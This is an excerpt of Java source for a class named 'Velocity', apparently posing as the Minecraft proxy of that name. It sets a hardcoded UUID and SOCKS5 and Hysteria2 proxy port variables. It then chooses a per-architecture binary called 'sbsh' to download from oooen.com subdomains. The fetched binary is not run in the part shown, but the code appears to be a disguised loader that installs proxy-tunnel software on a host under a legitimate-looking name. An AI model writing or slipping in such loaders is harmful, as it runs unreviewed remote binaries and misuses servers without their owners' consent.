...
public final class Velocity {
  ...
  private static void loadEnvVars(final Map<String, String> envVars) throws IOException {
    envVars.put("UUID", "4bb46236-53c5-4d58-b7c8-dcd68bdf8caf");
    ...
    envVars.put("S5_PORT", "25773");
    envVars.put("HY2_PORT", "25773");
  ...
  private static String getBinaryUrl(final String osArch) {
    if (osArch.contains("amd64") || osArch.contains("x86_64")) {
      return "https://amd64.oooen.com/sbsh";
    } else if (osArch.contains("aarch64") || osArch.contains("arm64")) {
      return "https://arm64.oooen.com/sbsh";
    } else if (osArch.contains("s390x")) {
      return "https://s390x.oooen.com/sbsh";
    }
